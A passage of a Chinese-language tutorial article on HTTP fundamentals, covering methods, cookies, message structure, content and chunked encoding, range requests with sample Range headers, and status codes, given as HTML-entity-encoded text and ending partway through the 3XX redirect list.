Identifier&#x7684;&#x7F29;&#x5199;&#x662F;&#x7531;&#x67D0;&#x4E2A;&#x534F;&#x8BAE;&#x65B9;&#x6848;&#x8868;&#x793A;&#x7684;&#x8D44;&#x6E90;&#x7684;&#x5B9A;&#x4F4D;&#x6807;&#x8BC6;&#x7B26;&#x3002;&#x534F;&#x8BAE;&#x65B9;&#x6848;&#x662F;&#x6307;&#x8BBF;&#x95EE;&#x8D44;&#x6E90;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x534F;&#x8BAE;&#x7C7B;&#x578B;&#x540D;&#x79F0;&#x3002;&#x91C7;&#x7528;HTTP&#x534F;&#x8BAE;&#x65F6;&#xFF0C;&#x534F;&#x8BAE;&#x65B9;&#x6848;&#x5C31;&#x662F;http&#x3002;&#x9664;&#x6B64;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x6709;ftp&#x3001;mailto&#x3001;telnet&#x3001;file&#x7B49;&#x3002;&#x6807;&#x51C6;&#x7684;URI&#x534F;&#x8BAE;&#x65B9;&#x6848;&#x6709;30&#x79CD;&#x5DE6;&#x53F3;&#x3002;URI&#x7528;&#x5B57;&#x7B26;&#x4E32;&#x6807;&#x8BC6;&#x67D0;&#x4E00;&#x4E92;&#x8054;&#x7F51;&#x8D44;&#x6E90;&#xFF0C;&#x800C;URL&#x8868;&#x793A;&#x8D44;&#x6E90;&#x7684;&#x5730;&#x70B9;&#xFF08;&#x4E92;&#x8054;&#x7F51;&#x4E0A;&#x6240;&#x5904;&#x7684;&#x4F4D;&#x7F6E;&#xFF09;&#x3002;&#x53EF;&#x89C1;URL&#x662F;URI&#x7684;&#x5B50;&#x96C6;&#x3002;</p>
<h2 id="%E7%AE%80%E5%8D%95%E7%9A%84http%E5%8D%8F%E8%AE%AE">&#x7B80;&#x5355;&#x7684;HTTP&#x534F;&#x8BAE;</h2>
<p>HTTP&#x534F;&#x8BAE;&#x89C4;&#x5B9A;&#xFF0C;&#x8BF7;&#x6C42;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x51FA;&#xFF0C;&#x6700;&#x540E;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x54CD;&#x5E94;&#x8BE5;&#x8BF7;&#x6C42;&#x5E76;&#x8FD4;&#x56DE;&#x3002;&#x6362;&#x53E5;&#x8BDD;&#x8BF4;&#xFF0C;&#x80AF;&#x5B9A;&#x662F;&#x5148;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x5F00;&#x59CB;&#x5EFA;&#x7ACB;&#x901A;&#x4FE1;&#x7684;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5728;&#x6CA1;&#x6709;&#x63A5;&#x6536;&#x5230;&#x8BF7;&#x6C42;&#x4E4B;&#x524D;&#x4E0D;&#x4F1A;&#x53D1;&#x9001;&#x54CD;&#x5E94;&#x3002;</p>
<p>&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x662F;&#x7531;&#x8BF7;&#x6C42;&#x65B9;&#x6CD5;&#x3001;&#x8BF7;&#x6C42;URI&#x3001;&#x534F;&#x8BAE;&#x7248;&#x672C;&#x3001;&#x53EF;&#x9009;&#x7684;&#x8BF7;&#x6C42;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x548C;&#x5185;&#x5BB9;&#x5B9E;&#x4F53;&#x6784;&#x6210;&#x7684;&#x3002;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x57FA;&#x672C;&#x4E0A;&#x7531;&#x534F;&#x8BAE;&#x7248;&#x672C;&#x3001;&#x72B6;&#x6001;&#x7801;&#xFF08;&#x8868;&#x793A;&#x8BF7;&#x6C42;&#x6210;&#x529F;&#x6216;&#x5931;&#x8D25;&#x7684;&#x6570;&#x5B57;&#x4EE3;&#x7801;&#xFF09;&#x3001;&#x7528;&#x4EE5;&#x89E3;&#x91CA;&#x72B6;&#x6001;&#x7801;&#x7684;&#x539F;&#x56E0;&#x77ED;&#x8BED;&#x3001;&#x53EF;&#x9009;&#x7684;&#x54CD;&#x5E94;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x4EE5;&#x53CA;&#x5B9E;&#x4F53;&#x4E3B;&#x4F53;&#x6784;&#x6210;&#x3002;</p>
<p>GET&#x65B9;&#x6CD5;&#x7528;&#x6765;&#x8BF7;&#x6C42;&#x8BBF;&#x95EE;&#x5DF2;&#x88AB;URI&#x8BC6;&#x522B;&#x7684;&#x8D44;&#x6E90;&#x3002;&#x6307;&#x5B9A;&#x7684;&#x8D44;&#x6E90;&#x7ECF;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x89E3;&#x6790;&#x540E;&#x8FD4;&#x56DE;&#x54CD;&#x5E94;&#x5185;&#x5BB9;&#x3002;POST&#x65B9;&#x6CD5;&#x7528;&#x6765;&#x4F20;&#x8F93;&#x5B9E;&#x4F53;&#x7684;&#x4E3B;&#x4F53;&#x3002;&#x867D;&#x8BF4;POST&#x7684;&#x529F;&#x80FD;&#x4E0E;GET&#x5F88;&#x76F8;&#x4F3C;&#xFF0C;&#x4F46;POST&#x7684;&#x4E3B;&#x8981;&#x76EE;&#x7684;&#x5E76;&#x4E0D;&#x662F;&#x83B7;&#x53D6;&#x54CD;&#x5E94;&#x7684;&#x4E3B;&#x4F53;&#x5185;&#x5BB9;&#x3002;PUT&#x65B9;&#x6CD5;&#x7528;&#x6765;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#x3002;&#x5C31;&#x50CF;FTP&#x534F;&#x8BAE;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x4E00;&#x6837;&#xFF0C;&#x8981;&#x6C42;&#x5728;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x7684;&#x4E3B;&#x4F53;&#x4E2D;&#x5305;&#x542B;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF0C;&#x7136;&#x540E;&#x4FDD;&#x5B58;&#x5230;&#x8BF7;&#x6C42;URI&#x6307;&#x5B9A;&#x7684;&#x4F4D;&#x7F6E;&#x3002;HEAD&#x65B9;&#x6CD5;&#x548C;GET&#x65B9;&#x6CD5;&#x4E00;&#x6837;&#xFF0C;&#x53EA;&#x662F;&#x4E0D;&#x8FD4;&#x56DE;&#x62A5;&#x6587;&#x4E3B;&#x4F53;&#x90E8;&#x5206;&#x3002;&#x7528;&#x4E8E;&#x786E;&#x8BA4;URI&#x7684;&#x6709;&#x6548;&#x6027;&#x53CA;&#x8D44;&#x6E90;&#x66F4;&#x65B0;&#x7684;&#x65E5;&#x671F;&#x65F6;&#x95F4;&#x7B49;&#x3002;DELETE&#x65B9;&#x6CD5;&#x7528;&#x6765;&#x5220;&#x9664;&#x6587;&#x4EF6;&#xFF0C;&#x662F;&#x4E0E;PUT&#x76F8;&#x53CD;&#x7684;&#x65B9;&#x6CD5;&#x3002;DELETE&#x65B9;&#x6CD5;&#x6309;&#x8BF7;&#x6C42;URI&#x5220;&#x9664;&#x6307;&#x5B9A;&#x7684;&#x8D44;&#x6E90;&#x3002;OPTIONS&#x65B9;&#x6CD5;&#x7528;&#x6765;&#x67E5;&#x8BE2;&#x9488;&#x5BF9;&#x8BF7;&#x6C42;URI&#x6307;&#x5B9A;&#x7684;&#x8D44;&#x6E90;&#x652F;&#x6301;&#x7684;&#x65B9;&#x6CD5;&#x3002;TRACE&#x65B9;&#x6CD5;&#x662F;&#x8BA9;Web&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5C06;&#x4E4B;&#x524D;&#x7684;&#x8BF7;&#x6C42;&#x901A;&#x4FE1;&#x73AF;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x65B9;&#x6CD5;&#x3002;CONNECT&#x65B9;&#x6CD5;&#x8981;&#x6C42;&#x5728;&#x4E0E;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x901A;&#x4FE1;&#x65F6;&#x5EFA;&#x7ACB;&#x96A7;&#x9053;&#xFF0C;&#x5B9E;&#x73B0;&#x7528;&#x96A7;&#x9053;&#x534F;&#x8BAE;&#x8FDB;&#x884C;TCP&#x901A;&#x4FE1;&#x3002;</p>
<h3 id="%E4%BD%BF%E7%94%A8cookie%E7%9A%84%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86">&#x4F7F;&#x7528;Cookie&#x7684;&#x72B6;&#x6001;&#x7BA1;&#x7406;</h3>
<p>&#x4E0D;&#x53EF;&#x5426;&#x8BA4;&#xFF0C;&#x65E0;&#x72B6;&#x6001;&#x534F;&#x8BAE;&#x5F53;&#x7136;&#x4E5F;&#x6709;&#x5B83;&#x7684;&#x4F18;&#x70B9;&#x3002;&#x7531;&#x4E8E;&#x4E0D;&#x5FC5;&#x4FDD;&#x5B58;&#x72B6;&#x6001;&#xFF0C;&#x81EA;&#x7136;&#x53EF;&#x51CF;&#x5C11;&#x670D;&#x52A1;&#x5668;&#x7684;CPU&#x53CA;&#x5185;&#x5B58;&#x8D44;&#x6E90;&#x7684;&#x6D88;&#x8017;&#x3002;Cookie&#x6280;&#x672F;&#x901A;&#x8FC7;&#x5728;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x4E2D;&#x5199;&#x5165;Cookie&#x4FE1;&#x606F;&#x6765;&#x63A7;&#x5236;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x72B6;&#x6001;&#x3002;Cookie&#x4F1A;&#x6839;&#x636E;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53D1;&#x9001;&#x7684;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x5185;&#x7684;&#x4E00;&#x4E2A;&#x53EB;&#x505A;Set-Cookie&#x7684;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x4FE1;&#x606F;&#xFF0C;&#x901A;&#x77E5;&#x5BA2;&#x6237;&#x7AEF;&#x4FDD;&#x5B58;Cookie&#x3002;&#x5F53;&#x4E0B;&#x6B21;&#x5BA2;&#x6237;&#x7AEF;&#x518D;&#x5F80;&#x8BE5;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x4F1A;&#x81EA;&#x52A8;&#x5728;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x4E2D;&#x52A0;&#x5165;Cookie&#x503C;&#x540E;&#x53D1;&#x9001;&#x51FA;&#x53BB;&#x3002;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53D1;&#x73B0;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x8FC7;&#x6765;&#x7684;Cookie&#x540E;&#xFF0C;&#x4F1A;&#x53BB;&#x68C0;&#x67E5;&#x7A76;&#x7ADF;&#x662F;&#x4ECE;&#x54EA;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x6765;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x6BD4;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x8BB0;&#x5F55;&#xFF0C;&#x6700;&#x540E;&#x5F97;&#x5230;&#x4E4B;&#x524D;&#x7684;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#x3002;</p>
<h2 id="http%E6%8A%A5%E6%96%87%E5%86%85%E7%9A%84http%E4%BF%A1%E6%81%AF">HTTP&#x62A5;&#x6587;&#x5185;&#x7684;HTTP&#x4FE1;&#x606F;</h2>
<p>&#x7528;&#x4E8E;HTTP&#x534F;&#x8BAE;&#x4EA4;&#x4E92;&#x7684;&#x4FE1;&#x606F;&#x88AB;&#x79F0;&#x4E3A;HTTP&#x62A5;&#x6587;&#x3002;&#x8BF7;&#x6C42;&#x7AEF;&#xFF08;&#x5BA2;&#x6237;&#x7AEF;&#xFF09;&#x7684;HTTP&#x62A5;&#x6587;&#x53EB;&#x505A;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#xFF0C;&#x54CD;&#x5E94;&#x7AEF;&#xFF08;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#xFF09;&#x7684;&#x53EB;&#x505A;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x3002;HTTP&#x62A5;&#x6587;&#x5927;&#x81F4;&#x53EF;&#x5206;&#x4E3A;&#x62A5;&#x6587;&#x9996;&#x90E8;&#x548C;&#x62A5;&#x6587;&#x4E3B;&#x4F53;&#x4E24;&#x5757;&#x3002;&#x4E24;&#x8005;&#x7531;&#x6700;&#x521D;&#x51FA;&#x73B0;&#x7684;&#x7A7A;&#x884C;&#x6765;&#x5212;&#x5206;&#x3002;&#x901A;&#x5E38;&#x5E76;&#x4E0D;&#x4E00;&#x5B9A;&#x8981;&#x6709;&#x62A5;&#x6587;&#x4E3B;&#x4F53;&#x3002;</p>
<p>&#x8BF7;&#x6C42;&#x884C;&#x5305;&#x542B;&#x7528;&#x4E8E;&#x8BF7;&#x6C42;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x8BF7;&#x6C42;URI&#x548C;HTTP&#x7248;&#x672C;&#x3002;&#x72B6;&#x6001;&#x884C;&#x5305;&#x542B;&#x8868;&#x660E;&#x54CD;&#x5E94;&#x7ED3;&#x679C;&#x7684;&#x72B6;&#x6001;&#x7801;&#xFF0C;&#x539F;&#x56E0;&#x77ED;&#x8BED;&#x548C;HTTP&#x7248;&#x672C;&#x3002;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x5305;&#x542B;&#x8868;&#x793A;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x7684;&#x5404;&#x79CD;&#x6761;&#x4EF6;&#x548C;&#x5C5E;&#x6027;&#x7684;&#x5404;&#x7C7B;&#x9996;&#x90E8;&#x3002;&#x4E00;&#x822C;&#x6709;4&#x79CD;&#x9996;&#x90E8;&#xFF0C;&#x5206;&#x522B;&#x662F;&#xFF1A;&#x901A;&#x7528;&#x9996;&#x90E8;&#x3001;&#x8BF7;&#x6C42;&#x9996;&#x90E8;&#x3001;&#x54CD;&#x5E94;&#x9996;&#x90E8;&#x548C;&#x5B9E;&#x4F53;&#x9996;&#x90E8;&#x3002;&#x5176;&#x4ED6;&#x53EF;&#x80FD;&#x5305;&#x542B;HTTP&#x7684;RFC&#x91CC;&#x672A;&#x5B9A;&#x4E49;&#x7684;&#x9996;&#x90E8;&#xFF08;Cookie&#x7B49;&#xFF09;&#x3002;</p>
<p>&#x62A5;&#x6587;&#x4E3B;&#x4F53;&#x548C;&#x5B9E;&#x4F53;&#x4E3B;&#x4F53;&#x7684;&#x5DEE;&#x5F02;&#x5728;&#x4E8E;&#x62A5;&#x6587;&#xFF08;message&#xFF09;&#x662F;HTTP&#x901A;&#x4FE1;&#x4E2D;&#x7684;&#x57FA;&#x672C;&#x5355;&#x4F4D;&#xFF0C;&#x7531;8&#x4F4D;&#x7EC4;&#x5B57;&#x8282;&#x6D41;&#xFF08;octet sequence&#xFF0C;&#x5176;&#x4E2D;octet&#x4E3A;8&#x4E2A;&#x6BD4;&#x7279;&#xFF09;&#x7EC4;&#x6210;&#xFF0C;&#x901A;&#x8FC7;HTTP&#x901A;&#x4FE1;&#x4F20;&#x8F93;&#x3002;&#x5B9E;&#x4F53;&#xFF08;entity&#xFF09;&#x4F5C;&#x4E3A;&#x8BF7;&#x6C42;&#x6216;&#x54CD;&#x5E94;&#x7684;&#x6709;&#x6548;&#x8F7D;&#x8377;&#x6570;&#x636E;&#xFF08;&#x8865;&#x5145;&#x9879;&#xFF09;&#x88AB;&#x4F20;&#x8F93;&#xFF0C;&#x5176;&#x5185;&#x5BB9;&#x7531;&#x5B9E;&#x4F53;&#x9996;&#x90E8;&#x548C;&#x5B9E;&#x4F53;&#x4E3B;&#x4F53;&#x7EC4;&#x6210;&#x3002;</p>
<p>HTTP&#x534F;&#x8BAE;&#x4E2D;&#x6709;&#x4E00;&#x79CD;&#x88AB;&#x79F0;&#x4E3A;&#x5185;&#x5BB9;&#x7F16;&#x7801;&#x7684;&#x529F;&#x80FD;&#x4E5F;&#x80FD;&#x8FDB;&#x884C;&#x7C7B;&#x4F3C;&#x538B;&#x7F29;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x5185;&#x5BB9;&#x7F16;&#x7801;&#x6307;&#x660E;&#x5E94;&#x7528;&#x5728;&#x5B9E;&#x4F53;&#x5185;&#x5BB9;&#x4E0A;&#x7684;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x4FDD;&#x6301;&#x5B9E;&#x4F53;&#x4FE1;&#x606F;&#x539F;&#x6837;&#x538B;&#x7F29;&#x3002;&#x5185;&#x5BB9;&#x7F16;&#x7801;&#x540E;&#x7684;&#x5B9E;&#x4F53;&#x7531;&#x5BA2;&#x6237;&#x7AEF;&#x63A5;&#x6536;&#x5E76;&#x8D1F;&#x8D23;&#x89E3;&#x7801;&#x3002;&#x5E38;&#x7528;&#x7684;&#x5185;&#x5BB9;&#x7F16;&#x7801;&#x6709;&#xFF1A;gzip&#xFF08;GNU zip&#xFF09;&#x3001;compress&#xFF08;UNIX&#x7CFB;&#x7EDF;&#x7684;&#x6807;&#x51C6;&#x538B;&#x7F29;&#xFF09;&#x3002;</p>
<p>HTTP&#x901A;&#x4FE1;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x8BF7;&#x6C42;&#x7684;&#x7F16;&#x7801;&#x5B9E;&#x4F53;&#x8D44;&#x6E90;&#x5C1A;&#x672A;&#x5168;&#x90E8;&#x4F20;&#x8F93;&#x5B8C;&#x6210;&#x4E4B;&#x524D;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x65E0;&#x6CD5;&#x663E;&#x793A;&#x8BF7;&#x6C42;&#x9875;&#x9762;&#x3002;&#x5728;&#x4F20;&#x8F93;&#x5927;&#x5BB9;&#x91CF;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x901A;&#x8FC7;&#x628A;&#x6570;&#x636E;&#x5206;&#x5272;&#x6210;&#x591A;&#x5757;&#xFF0C;&#x80FD;&#x591F;&#x8BA9;&#x6D4F;&#x89C8;&#x5668;&#x9010;&#x6B65;&#x663E;&#x793A;&#x9875;&#x9762;&#x3002;&#x8FD9;&#x79CD;&#x628A;&#x5B9E;&#x4F53;&#x4E3B;&#x4F53;&#x5206;&#x5757;&#x7684;&#x529F;&#x80FD;&#x79F0;&#x4E3A;&#x5206;&#x5757;&#x4F20;&#x8F93;&#x7F16;&#x7801;&#xFF08;Chunked Transfer Coding&#xFF09;&#x3002;&#x4F7F;&#x7528;&#x5206;&#x5757;&#x4F20;&#x8F93;&#x7F16;&#x7801;&#x7684;&#x5B9E;&#x4F53;&#x4E3B;&#x4F53;&#x4F1A;&#x7531;&#x63A5;&#x6536;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x8D1F;&#x8D23;&#x89E3;&#x7801;&#xFF0C;&#x6062;&#x590D;&#x5230;&#x7F16;&#x7801;&#x524D;&#x7684;&#x5B9E;&#x4F53;&#x4E3B;&#x4F53;&#x3002;</p>
<p>HTTP&#x534F;&#x8BAE;&#x4E2D;&#x4E5F;&#x91C7;&#x7EB3;&#x4E86;&#x591A;&#x90E8;&#x5206;&#x5BF9;&#x8C61;&#x96C6;&#x5408;&#xFF0C;&#x53D1;&#x9001;&#x7684;&#x4E00;&#x4EFD;&#x62A5;&#x6587;&#x4E3B;&#x4F53;&#x5185;&#x53EF;&#x542B;&#x6709;&#x591A;&#x7C7B;&#x578B;&#x5B9E;&#x4F53;&#x3002;&#x901A;&#x5E38;&#x662F;&#x5728;&#x56FE;&#x7247;&#x6216;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x7B49;&#x4E0A;&#x4F20;&#x65F6;&#x4F7F;&#x7528;&#x3002;multipart/form-data &#x548C; multipart/byteranges &#x5206;&#x522B;&#x5728;Web&#x8868;&#x5355;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x65F6;&#x4F7F;&#x7528;&#xFF1B;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x5305;&#x542B;&#x4E86;&#x591A;&#x4E2A;&#x8303;&#x56F4;&#x7684;&#x5185;&#x5BB9;&#x65F6;&#x4F7F;&#x7528;&#x3002;</p>
<p>&#x5982;&#x679C;&#x4E0B;&#x8F7D;&#x8FC7;&#x7A0B;&#x4E2D;&#x9047;&#x5230;&#x7F51;&#x7EDC;&#x4E2D;&#x65AD;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x90A3;&#x5C31;&#x5FC5;&#x987B;&#x91CD;&#x5934;&#x5F00;&#x59CB;&#x3002;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x4E0A;&#x8FF0;&#x95EE;&#x9898;&#xFF0C;&#x9700;&#x8981;&#x4E00;&#x79CD;&#x53EF;&#x6062;&#x590D;&#x7684;&#x673A;&#x5236;&#x3002;&#x6240;&#x8C13;&#x6062;&#x590D;&#x662F;&#x6307;&#x80FD;&#x4ECE;&#x4E4B;&#x524D;&#x4E0B;&#x8F7D;&#x4E2D;&#x65AD;&#x5904;&#x6062;&#x590D;&#x4E0B;&#x8F7D;&#x3002;&#x8981;&#x5B9E;&#x73B0;&#x8BE5;&#x529F;&#x80FD;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x4E0B;&#x8F7D;&#x7684;&#x5B9E;&#x4F53;&#x8303;&#x56F4;&#xFF0C;&#x6307;&#x5B9A;&#x8303;&#x56F4;&#x53D1;&#x9001;&#x7684;&#x8BF7;&#x6C42;&#x53EB;&#x505A;&#x8303;&#x56F4;&#x8BF7;&#x6C42;&#xFF08;Range Request&#xFF09;&#x3002;&#x6267;&#x884C;&#x8303;&#x56F4;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x4F1A;&#x7528;&#x5230;&#x9996;&#x90E8;&#x5B57;&#x6BB5;Range&#x6765;&#x6307;&#x5B9A;&#x8D44;&#x6E90;&#x7684;byte&#x8303;&#x56F4;&#x3002;&#x9488;&#x5BF9;&#x8303;&#x56F4;&#x8BF7;&#x6C42;&#xFF0C;&#x54CD;&#x5E94;&#x4F1A;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801;&#x4E3A;206 Partial Content&#x7684;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5BF9;&#x4E8E;&#x591A;&#x91CD;&#x8303;&#x56F4;&#x7684;&#x8303;&#x56F4;&#x8BF7;&#x6C42;&#xFF0C;&#x54CD;&#x5E94;&#x4F1A;&#x5728;&#x9996;&#x90E8;&#x5B57;&#x6BB5;Content-Type&#x6807;&#x660E;multipart/byteranges&#x540E;&#x8FD4;&#x56DE;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x3002;&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x65E0;&#x6CD5;&#x54CD;&#x5E94;&#x8303;&#x56F4;&#x8BF7;&#x6C42;&#xFF0C;&#x5219;&#x4F1A;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801;200 OK&#x548C;&#x5B8C;&#x6574;&#x7684;&#x5B9E;&#x4F53;&#x5185;&#x5BB9;&#x3002;</p>
<pre><code class="language-javascript">// &#x4ECE;5001&#xFF5E;10000&#x5B57;&#x8282;
Range: bytes=5001-10000
// &#x4ECE;5001&#x5B57;&#x8282;&#x4E4B;&#x540E;&#x5168;&#x90E8;&#x7684;
Range: bytes=5001-
// &#x4ECE;&#x4E00;&#x5F00;&#x59CB;&#x5230;3000&#x5B57;&#x8282;&#x548C;5000&#xFF5E;7000&#x5B57;&#x8282;&#x7684;&#x591A;&#x91CD;&#x8303;&#x56F4;
Range: bytes=-3000, 5000-7000
</code></pre>
<h2 id="%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81">&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7684;HTTP&#x72B6;&#x6001;&#x7801;</h2>
<p>&#x72B6;&#x6001;&#x7801;&#x7684;&#x804C;&#x8D23;&#x662F;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x63CF;&#x8FF0;&#x8FD4;&#x56DE;&#x7684;&#x8BF7;&#x6C42;&#x7ED3;&#x679C;&#x3002;&#x501F;&#x52A9;&#x72B6;&#x6001;&#x7801;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x662F;&#x6B63;&#x5E38;&#x5904;&#x7406;&#x4E86;&#x8BF7;&#x6C42;&#xFF0C;&#x8FD8;&#x662F;&#x51FA;&#x73B0;&#x4E86;&#x9519;&#x8BEF;&#x3002;&#x6570;&#x5B57;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4F4D;&#x6307;&#x5B9A;&#x4E86;&#x54CD;&#x5E94;&#x7C7B;&#x522B;&#xFF0C;&#x540E;&#x4E24;&#x4F4D;&#x65E0;&#x5206;&#x7C7B;&#x3002;&#x54CD;&#x5E94;&#x7C7B;&#x522B;&#x6709;&#x4EE5;&#x4E0B;5&#x79CD;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/status-code.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;" loading="lazy"></p>
<h3 id="2xx%E6%88%90%E5%8A%9F">2XX&#x6210;&#x529F;</h3>
<ul>
<li>200 OK &#x8868;&#x793A;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x6765;&#x7684;&#x8BF7;&#x6C42;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x88AB;&#x6B63;&#x5E38;&#x5904;&#x7406;&#x4E86;&#x3002;</li>
<li>204 No Content &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x4EE3;&#x8868;&#x670D;&#x52A1;&#x5668;&#x63A5;&#x6536;&#x7684;&#x8BF7;&#x6C42;&#x5DF2;&#x6210;&#x529F;&#x5904;&#x7406;&#xFF0C;&#x4F46;&#x5728;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x4E2D;&#x4E0D;&#x542B;&#x5B9E;&#x4F53;&#x7684;&#x4E3B;&#x4F53;&#x90E8;&#x5206;&#x3002;&#x4E5F;&#x4E0D;&#x5141;&#x8BB8;&#x8FD4;&#x56DE;&#x4EFB;&#x4F55;&#x5B9E;&#x4F53;&#x7684;&#x4E3B;&#x4F53;&#x3002;</li>
<li>206 Partial Content &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x5BA2;&#x6237;&#x7AEF;&#x8FDB;&#x884C;&#x4E86;&#x8303;&#x56F4;&#x8BF7;&#x6C42;&#xFF0C;&#x800C;&#x670D;&#x52A1;&#x5668;&#x6210;&#x529F;&#x6267;&#x884C;&#x4E86;&#x8FD9;&#x90E8;&#x5206;&#x7684;GET&#x8BF7;&#x6C42;&#x3002;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x4E2D;&#x5305;&#x542B;&#x7531;Content-Range&#x6307;&#x5B9A;&#x8303;&#x56F4;&#x7684;&#x5B9E;&#x4F53;&#x5185;&#x5BB9;&#x3002;</li>
</ul>
<h3 id="3xx%E9%87%8D%E5%AE%9A%E5%90%91">3XX&#x91CD;&#x5B9A;&#x5411;</h3>
<ul>
<li>301 Moved Permanently &#x6C38;&#x4E45;&#x6027;&#x91CD;&#x5B9A;&#x5411;&#x3002;&#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x8BF7;&#x6C42;&#x7684;&#x8D44;&#x6E90;&#x5DF2;&#x88AB;&#x5206;&#x914D;&#x4E86;&#x65B0;&#x7684;URI&#xFF0C;&#x4EE5;&#x540E;&#x5E94;&#x4F7F;&#x7528;&#x8D44;&#x6E90;&#x73B0;&#x5728;&#x6240;&#x6307;&#x7684;URI&#x3002;&#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x628A;&#x8D44;&#x6E90;&#x5BF9;&#x5E94;&#x7684;URI&#x4FDD;&#x5B58;&#x4E3A;&#x4E66;&#x7B7E;&#x4E86;&#xFF0C;&#x8FD9;&#x65F6;&#x5E94;&#x8BE5;&#x6309;Location&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x63D0;&#x793A;&#x7684;URI&#x91CD;&#x65B0;&#x4FDD;&#x5B58;&#x3002;</li>
<li>302 Found &#x4E34;&#x65F6;&#x6027;&#x91CD;&#x5B9A;&#x5411;&#x3002;&#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x8BF7;&#x6C42;&#x7684;&#x8D44;&#x6E90;&#x5DF2;&#x88AB;&#x5206;&#x914D;&#x4E86;&#x65B0;&#x7684;URI&#xFF0C;&#x5E0C;&#x671B;&#x7528;&#x6237;&#xFF08;&#x672C;&#x6B21;&#xFF09;&#x80FD;&#x4F7F;&#x7528;&#x65B0;&#x7684;URI&#x8BBF;&#x95EE;&#x3002;</li>
